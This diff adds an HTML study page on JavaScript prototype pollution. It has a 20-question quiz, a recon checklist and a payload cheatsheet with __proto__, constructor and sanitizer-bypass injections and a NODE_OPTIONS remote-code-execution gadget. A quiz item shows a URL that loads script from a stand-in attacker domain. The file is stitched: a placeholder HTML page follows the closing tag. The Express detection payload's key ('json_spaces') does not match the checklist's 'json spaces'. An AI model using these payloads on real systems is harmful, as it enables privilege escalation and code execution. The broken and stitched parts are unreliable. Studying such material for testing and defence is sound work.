@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Prototype Pollution — Exam & Recon Kit</title>
+<style>
+:root{
+  --bg:#fdfbf7; --panel:#ffffff; --line:#e6e2da;
+  --text:#2b2d2f; --dim:#6c7176; --accent:#0ca678; --bad:#e03131;
+  --mono:'JetBrains Mono','Fira Code','Consolas',monospace;
+}
+*{box-sizing:border-box;}
+body{margin:0;background:var(--bg);color:var(--text);font-family:var(--mono);min-height:100vh;}
+.wrap{max-width:720px;margin:0 auto;padding:32px 20px 60px;}
+.tag{color:var(--accent);letter-spacing:.15em;font-size:12px;text-transform:uppercase;font-weight:bold;}
+h1{font-size:22px;margin:6px 0 26px;color:#111;}
+.bar{height:4px;background:var(--line);border-radius:2px;overflow:hidden;margin-bottom:22px;}
+.bar>div{height:100%;background:var(--accent);transition:width .3s;}
+.card{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:22px;box-shadow:0 4px 12px rgba(0,0,0,0.05);}
+.qnum{color:var(--dim);font-size:12px;margin-bottom:10px;}
+.qtext{font-size:16px;color:#111;margin-bottom:18px;line-height:1.5;}
+.opt{display:block;width:100%;text-align:left;background:#fafaf8;border:1px solid var(--line);
+  color:var(--text);padding:12px 14px;border-radius:7px;margin-bottom:10px;cursor:pointer;
+  font-family:var(--mono);font-size:13.5px;transition:.15s;}
+.opt:hover{border-color:var(--accent);background:#f0f9f6;box-shadow:0 0 8px rgba(12,166,120,0.1);}
+.opt.correct{background:#e6fcf5;border-color:#0ca678;color:#087f5b;}
+.opt.wrong{background:#fff5f5;border-color:var(--bad);color:var(--bad);}
+.opt[disabled]{cursor:default;}
+.score{color:var(--dim);font-size:13px;}
+.center{text-align:center;}
+.big{font-size:44px;color:var(--accent);margin:10px 0;}
+.btn{background:var(--accent);color:#fff;border:none;padding:12px 20px;border-radius:7px;
+  font-family:var(--mono);font-weight:bold;cursor:pointer;margin:6px 6px 0 0;font-size:13px;}
+.btn.alt{background:transparent;border:1px solid var(--accent);color:var(--accent);}
+.emoji{font-size:26px;position:fixed;top:-30px;animation:fall linear forwards;pointer-events:none;z-index:9999;}
+@keyframes fall{to{transform:translateY(105vh) rotate(360deg);opacity:.2;}}
+h2{color:#111;font-size:15px;border-bottom:1px solid var(--line);padding-bottom:8px;margin-top:30px;}
+h3{color:var(--accent);font-size:14px;margin-top:20px;margin-bottom:5px;}
+.chk{display:flex;gap:10px;align-items:flex-start;padding:8px 0;border-bottom:1px dashed var(--line);font-size:13.5px;}
+.chk input{margin-top:3px;accent-color:var(--accent);}
+.chk.done label{color:var(--dim);text-decoration:line-through;}
+pre{background:#f8f9fa;border:1px solid var(--line);border-radius:7px;padding:12px 14px;
+  overflow-x:auto;font-size:12.5px;color:#2b2d2f;margin:8px 0 4px;}
+.pname{color:var(--accent);font-size:12.5px;margin-top:16px;font-weight:bold;}
+#quizView,#kitView{display:none;}
+.explain{margin-top:12px;padding:12px 14px;background:#f8f9fa;border:1px solid var(--line);
+  border-radius:7px;font-size:13px;color:var(--dim);line-height:1.5;display:none;}
+.explain b{color:var(--accent);}
+.topbtn{margin-bottom:18px;}
+#nextBtn{display:none;margin-top:16px;}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="tag">WVAPT // Prototype Pollution</div>
+  <h1 id="pageTitle">Concept Check — 20 Questions</h1>
+
+  <div id="quizView">
+    <button class="btn alt topbtn" onclick="showKit()">Skip → Bug Bounty Checklist + Payloads</button>
+    <div class="bar"><div id="prog" style="width:0%"></div></div>
+    <div class="card">
+      <div class="qnum"><span id="qIndex">1</span>/20 &nbsp;·&nbsp; <span class="score">score: <span id="scoreLive">0</span></span></div>
+      <div class="qtext" id="qText"></div>
+      <div id="opts"></div>
+      <div class="explain" id="explain"></div>
+      <button class="btn" id="nextBtn" onclick="goNext()">Next →</button>
+    </div>
+  </div>
+
+  <div id="doneView" class="card center" style="display:none;">
+    <div class="tag">Result</div>
+    <div class="big"><span id="finalScore">0</span>/20</div>
+    <div id="finalMsg" style="color:var(--dim);margin-bottom:16px;"></div>
+    <button class="btn" onclick="restart()">Retake Exam</button>
+    <button class="btn alt" onclick="showKit()">Bug Bounty Checklist + Payloads →</button>
+  </div>
+
+  <div id="kitView">
+    <button class="btn alt" onclick="showQuiz()">← Back to Exam</button>
+
+    <h2>Recon Checklist</h2>
+    <div id="checklist"></div>
+
+    <h2>Payload Cheatsheet</h2>
+    <div id="payloads"></div>
+  </div>
+</div>
+
+<script>
+// Exam-level difficulty: All options are nearly identical in length to prevent guessing.
+const Q=[
+["What is Prototype Pollution?",["A vulnerability that lets an attacker add properties to global object prototypes","A CSS injection technique used to deface the frontend styles locally","A SQL injection variant targeting the backend database directly","A DNS spoofing method used to redirect users to malicious sites"],0,
+"It allows attackers to manipulate the fundamental object prototypes in JavaScript, affecting all objects."],
+["In JavaScript, which special property provides a reference to an object's prototype?",["The __proto__ property securely and locally within the codebase","The __init__ property globally and entirely within the environment","The __proto property directly and fully within the application","The prototype__ property safely and now within the execution"],0,
+"The __proto__ property is an accessor property that exposes the internal prototype of an object."],
+["What is Object.prototype commonly referred to as in this guide's analogy?",["The shared master notebook locally and entirely within the system","The private notebook securely and safely within the user session","The blacklist used for blocking malicious input safely now","The sandbox environment for testing code securely globally"],0,
+"It acts as a shared template; properties added here are inherited by all other objects in JS."],
+["Which type of function in vulnerable code most commonly causes prototype pollution?",["Recursive merge, clone, or extend functions that combine objects securely","The standard console.log() function used for debugging locally now","The Array.prototype.map() function used for iteration entirely","The standard setTimeout() function used for delays directly"],0,
+"Functions that recursively merge objects without checking for '__proto__' keys are the primary cause."],
+["What does the payload {\"__proto__\": {\"isAdmin\": true}} attempt to do?",["Pollute the shared prototype so all objects inherit isAdmin: true","Set isAdmin only on the current object being parsed locally","Crash the JSON parser completely and cause a denial of service","Do nothing, __proto__ is always blocked by JSON.parse() safely"],0,
+"It injects a property into the global prototype so that any object checking 'isAdmin' without defining it will return true."],
+["True or False: JSON.parse('{\"__proto__\": {\"x\":1}}') produces an object where hasOwnProperty('__proto__') returns true.",["True, because unlike an object literal, JSON.parse treats __proto__ as a literal own key","False, because JSON.parse automatically delegates __proto__ to the global prototype chain","True, because JSON.parse ignores all prototype chain logic entirely during parsing","False, because JSON.parse throws a syntax error when encountering the __proto__ string"],0,
+"JSON.parse assigns it as a standard property on the object itself, rather than modifying the prototype."],
+["What are the 3 key ingredients required for successful exploitation of prototype pollution?",["Source, Sink, and Gadget are required to successfully exploit the flaw","Source, Payload, and Exploit are required to successfully exploit the flaw","Injection, Reflection, and Execution are required to successfully exploit the flaw","Query, Header, and Body are required to successfully exploit the flaw"],0,
+"You need an input source, a sink where execution happens, and a gadget property to bridge them."],
+["What is a 'Source' in prototype pollution terminology?",["Any user-controllable input that lets you inject properties into a prototype","A function that executes arbitrary code on the server or client side","The original vulnerable library that was imported into the application","A CVE database entry documenting the specific vulnerability globally"],0,
+"A source is the entry point where attacker-controlled data is parsed and merged into objects."],
+["What is a 'Sink' in this context?",["A function or DOM element that enables arbitrary code execution","A place where errors and stack traces are logged for debugging","A type of gadget used to chain multiple execution methods together","A CSS selector used to target elements for styling manipulation"],0,
+"The sink is the execution point (like innerHTML or eval) that ultimately consumes the polluted data."],
+["What makes a property qualify as a usable 'Gadget'?",["It's used unsafely by the app AND is attacker-controllable via the prototype","It must be a function, never a plain value, to execute arbitrary code","It must be hardcoded in the source code by the developer directly","It must appear in the URL parameters to be accessible to the attacker"],0,
+"The app must read a property that it doesn't explicitly define on the object itself, falling back to the prototype."],
+["Why can a property NOT be a gadget if it's defined directly on the object itself?",["Because the object's own property takes precedence over the polluted prototype","Because the application crashes when conflicting properties are detected","Because JSON.parse blocks local properties from overriding prototypes","Because sinks are completely unrelated to object properties in execution"],0,
+"JavaScript's prototype chain lookup stops at the first matching property found on the instance itself."],
+["Which of these is NOT listed as a common prototype pollution source?",["CSS stylesheets are not a common source of prototype pollution directly","URL query string or fragment string parameters are common sources","JSON-based input bodies sent to the application are common sources","Web messages sent via the postMessage API are common sources"],0,
+"While CSS can be used for exfiltration, it is not a standard vector for prototype pollution sources."],
+["In the URL ?__proto__[transport_url]=//evil-user.net, what is the attacker trying to achieve?",["Pollute transport_url so a script tag loads JS from an attacker's domain","Redirecting the whole page via a 302 HTTP status code to a malicious site","Performing a Cross-Site Request Forgery attack against the victim user","Bypassing CORS headers to steal data from a different origin endpoint"],0,
+"By polluting the transport_url, the application will dynamically load a script from the attacker's server."],
+["What tool, built into Burp Suite's browser, automates finding client-side prototype pollution sources and gadgets?",["DOM Invader automates finding client-side prototype pollution sources safely","Burp Intruder automates finding client-side prototype pollution sources locally","Burp Collaborator automates finding client-side prototype pollution globally","Param Miner automates finding client-side prototype pollution entirely"],0,
+"DOM Invader automatically tests sources and identifies gadgets to prove client-side impact."],
+["Besides __proto__, what other property can be used to reach Object.prototype, making simple __proto__ blocklists insufficient?",["The .constructor.prototype property chain can reach the global object","The .hasOwnProperty method can reach the global object prototype securely","The .toString method can reach the global object prototype locally now","The .valueOf method can reach the global object prototype entirely"],0,
+"If an object has a constructor, its prototype can be accessed and polluted directly."],
+["What is the flaw in sanitization demonstrated by this URL? ?__pro__proto__to__.gadget=payload",["The sanitizer strips 'proto' only once, leaving a valid __proto__ string behind","It uses double encoding to bypass the Web Application Firewall entirely","It uses Unicode characters to confuse the input validation logic locally","It is not actually a bypass and fails to exploit the vulnerability safely"],0,
+"Non-recursive sanitizers can be bypassed by embedding the blacklisted string within itself."],
+["Why is server-side prototype pollution generally HARDER to detect than client-side?",["No dev tools, risk of DoS, and pollution persists for the process lifetime","Servers don't use JavaScript for backend logic and processing securely","Server-side JS doesn't have prototypes in its object-oriented model","It is actually easier, not harder, to detect on the server side entirely"],0,
+"Without a console, testing server-side is blind. Polluting the wrong property can crash the Node process."],
+["Which non-destructive technique involves injecting a json spaces property to test for Express-based server-side prototype pollution?",["JSON spaces override technique is used to test Express-based servers securely","Status code override technique is used to test Express-based servers locally","Charset override technique is used to test Express-based servers globally","Header smuggling technique is used to test Express-based servers entirely"],0,
+"Express uses a 'json spaces' config to format responses; polluting it visibly changes the response indentation."],
+["In Node.js, which property (controllable via prototype pollution if undefined) can be combined with a shell property to trigger interactions with Burp Collaborator or achieve RCE?",["NODE_OPTIONS can be combined with a shell property to trigger RCE safely","PATH can be combined with a shell property to trigger RCE locally and now","HOME can be combined with a shell property to trigger RCE entirely and fully","NODE_ENV can be combined with a shell property to trigger RCE globally"],0,
+"Polluting NODE_OPTIONS with --require /path/to/malicious.js forces Node to load attacker code on child process spawn."],
+["What is the MOST robust long-term defense against prototype pollution (better than blocklisting keys)?",["Using Object.freeze(Object.prototype), Object.create(null), or Map/Set safely","Renaming __proto__ in your codebase to a custom string value locally","Disabling JSON.parse entirely on all incoming network requests globally","Rate-limiting requests to prevent automated brute force attacks directly"],0,
+"Freezing the prototype prevents modifications entirely, and Map/Set don't rely on the prototype chain."]
+];
+
+const CHECKLIST_DATA = [
+  { title: "1. Source Identification", items: [
+    "Look for recursive merge/extend functions in JavaScript libraries.",
+    "Identify user-controllable inputs: URL parameters, JSON bodies, postMessage events.",
+    "Test for parser differences between <code>JSON.parse</code> and object literals."
+  ]},
+  { title: "2. Client-Side Exploitation", items: [
+    "Inject <code>?__proto__[isAdmin]=true</code> via URL parameters.",
+    "Check if DOM elements or JS variables reflect the polluted property.",
+    "Use Burp Suite's DOM Invader to automatically find sources and gadgets."
+  ]},
+  { title: "3. Bypassing Sanitization", items: [
+    "If <code>__proto__</code> is blocked, test <code>constructor.prototype</code>.",
+    "Test non-recursive sanitizers with <code>?__pro__proto__to__[x]=y</code>.",
+    "Use Unicode or alternative casing if weak regex filters are applied."
+  ]},
+  { title: "4. Server-Side Detection (Node.js)", items: [
+    "Test for Express 'json spaces' override: <code>{\"__proto__\":{\"json spaces\":10}}</code>.",
+    "Observe response formatting changes to confirm pollution without crashing the server.",
+    "Check for other non-destructive keys like <code>status</code> or <code>charset</code>."
+  ]},
+  { title: "5. Server-Side RCE (Gadgets)", items: [
+    "Target <code>NODE_OPTIONS</code> to require a malicious module on child process spawn.",
+    "Combine with gadgets in libraries like EJS, Pug, or Handlebars.",
+    "Use Burp Collaborator to detect blind out-of-band interactions."
+  ]}
+];
+
+const PAYLOADS = [
+  { name: "1. Basic Client-Side Payload", code: "?__proto__[isAdmin]=true\n?__proto__.isAdmin=true" },
+  { name: "2. Constructor Bypass", code: "?constructor[prototype][isAdmin]=true\n?constructor.prototype.isAdmin=true" },
+  { name: "3. Sanitizer Bypass", code: "?__pro__proto__to__[isAdmin]=true" },
+  { name: "4. Server-Side Detection (Express)", code: "POST /api/save\n{\n  \"__proto__\": {\n    \"json_spaces\": 10\n  }\n}" },
+  { name: "5. Node.js RCE Gadget (NODE_OPTIONS)", code: "{\n  \"__proto__\": {\n    \"NODE_OPTIONS\": \"--require /proc/self/environ\"\n  }\n}" }
+];
+
+let cur=0,score=0;
+
+function shuffle(a){for(let i=a.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[a[i],a[j]]=[a[j],a[i]];}return a;}
+
+function renderQ(){
+  document.getElementById('prog').style.width=(cur/Q.length*100)+'%';
+  document.getElementById('qIndex').textContent=cur+1;
+  document.getElementById('scoreLive').textContent=score;
+  const [text,opts,correctIdx,why]=Q[cur];
+  document.getElementById('qText').textContent=text;
+  const exp=document.getElementById('explain');
+  exp.style.display='none';exp.innerHTML='';
+  let arr=opts.map((o,i)=>({o,correct:i===correctIdx}));
+  shuffle(arr);
+  const box=document.getElementById('opts');
+  box.innerHTML='';
+  arr.forEach(item=>{
+    const b=document.createElement('button');
+    b.className='opt';b.textContent=item.o;
+    b.onclick=()=>pick(b,item.correct,box,item.o,why,arr);
+    box.appendChild(b);
+  });
+  document.getElementById('nextBtn').style.display='none';
+}
+
+function pick(btn,isCorrect,box,pickedText,why,arr){
+  [...box.children].forEach(c=>c.disabled=true);
+  const exp=document.getElementById('explain');
+  if(isCorrect){
+    btn.classList.add('correct');score++;
+    exp.innerHTML=`<b>Correct.</b> ${why}`;
+  }else{
+    btn.classList.add('wrong');
+    const correctText=arr.find(a=>a.correct).o;
+    [...box.children].forEach(c=>{if(c.textContent===correctText)c.classList.add('correct');});
+    exp.innerHTML=`<b>Correct answer:</b> ${correctText}<br>${why}`;
+  }
+  exp.style.display='block';
+  document.getElementById('scoreLive').textContent=score;
+  const nb=document.getElementById('nextBtn');
+  nb.style.display='inline-block';
+  nb.textContent=(cur+1<Q.length)?'Next →':'See Results →';
+}
+
+function goNext(){
+  cur++;
+  if(cur<Q.length)renderQ();else finish();
+}
+
+function finish(){
+  document.getElementById('prog').style.width='100%';
+  document.getElementById('quizView').style.display='none';
+  document.getElementById('doneView').style.display='block';
+  document.getElementById('finalScore').textContent=score;
+  const msg=score===20?"PROTOTYPE POLLUTED. Global state hijacked.":
+    score>=15?"Solid grasp — revisit the weak spots.":
+    score>=10?"Halfway there — reread the tricky sections.":
+    "Go back through the concept steps before diving into labs.";
+  document.getElementById('finalMsg').textContent=msg;
+  if(score===20) confetti();
+}
+
+function confetti(){
+  const em=['🌱','✅','🧩','⚛️','🟢'];
+  for(let i=0;i<30;i++){
+    setTimeout(()=>{
+      const s=document.createElement('div');
+      s.className='emoji';s.textContent=em[Math.floor(Math.random()*em.length)];
+      s.style.left=Math.random()*100+'vw';
+      s.style.animationDuration=(2+Math.random()*1.5)+'s';
+      document.body.appendChild(s);
+      setTimeout(()=>s.remove(),4000);
+    },i*60);
+  }
+}
+
+function restart(){
+  cur=0;score=0;
+  document.getElementById('doneView').style.display='none';
+  document.getElementById('kitView').style.display='none';
+  document.getElementById('quizView').style.display='block';
+  document.getElementById('pageTitle').textContent='Concept Check — 20 Questions';
+  renderQ();
+}
+
+let cameFromDone=false;
+function showKit(){
+  cameFromDone=document.getElementById('doneView').style.display==='block';
+  document.getElementById('doneView').style.display='none';
+  document.getElementById('quizView').style.display='none';
+  document.getElementById('kitView').style.display='block';
+  document.getElementById('pageTitle').textContent='Bug Bounty Recon Kit';
+}
+function showQuiz(){
+  document.getElementById('kitView').style.display='none';
+  if(cameFromDone){
+    document.getElementById('doneView').style.display='block';
+  }else{
+    document.getElementById('quizView').style.display='block';
+  }
+  document.getElementById('pageTitle').textContent='Concept Check — 20 Questions';
+}
+
+function buildChecklist(){
+  const c=document.getElementById('checklist');
+  const saved=JSON.parse(localStorage.getItem('proto_light_v1')||'{}');
+  let html='';
+  let idx=0;
+  CHECKLIST_DATA.forEach(section => {
+    html += `<h3>${section.title}</h3>`;
+    section.items.forEach(item => {
+      const isChecked = saved[idx] ? 'checked' : '';
+      const isDone = saved[idx] ? ' done' : '';
+      html += `<div class="chk${isDone}">
+        <input type="checkbox" id="c${idx}" ${isChecked}>
+        <label for="c${idx}">${item}</label>
+      </div>`;
+      idx++;
+    });
+  });
+  c.innerHTML = html;
+  
+  idx=0;
+  CHECKLIST_DATA.forEach(section => {
+    section.items.forEach(item => {
+      const checkbox = document.getElementById(`c${idx}`);
+      const row = checkbox.parentElement;
+      checkbox.onchange = e => {
+        saved[idx] = e.target.checked;
+        localStorage.setItem('proto_light_v1', JSON.stringify(saved));
+        row.classList.toggle('done', e.target.checked);
+      };
+      idx++;
+    });
+  });
+}
+
+function buildPayloads(){
+  const p=document.getElementById('payloads');
+  let html='';
+  const esc = s => s.replace(/</g, '&lt;').replace(/>/g, '&gt;'); // Prevent live HTML execution
+  PAYLOADS.forEach(item => {
+    html += `<div class="pname">${item.name}</div><pre>${esc(item.code)}</pre>`;
+  });
+  p.innerHTML = html;
+}
+
+document.getElementById('quizView').style.display='block';
+renderQ();
+buildChecklist();
+buildPayloads();
+</script>
+</body>
+</html><!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Prototype Pollution</title>
+<style>
+  body { font-family: system-ui, sans-serif; background:#10141a; color:#e8ebf1; margin:0; padding:48px 24px; }
+  .box { max-width:640px; margin:0 auto; border:1px dashed #2a3242; border-radius:10px; padding:32px; }
+  h1 { margin-top:0; }
+  p { color:#8791a3; line-height:1.6; }
+  code { background:#1e2530; padding:2px 6px; border-radius:4px; }
+  a { color:#ffb020; }
+</style>
+</head>
+<body>
+  <div class="box">
+    <h1>Prototype Pollution</h1>
+    <p>A08 — Software and Data Integrity Failures</p>
+    <p>Replace this file with your real quiz / payload / checklist page — same filename, so the dashboard link keeps working.</p>
+    <p><a href="../../index.html">&larr; Back to dashboard</a></p>
+  </div>
+</body>
+</html>
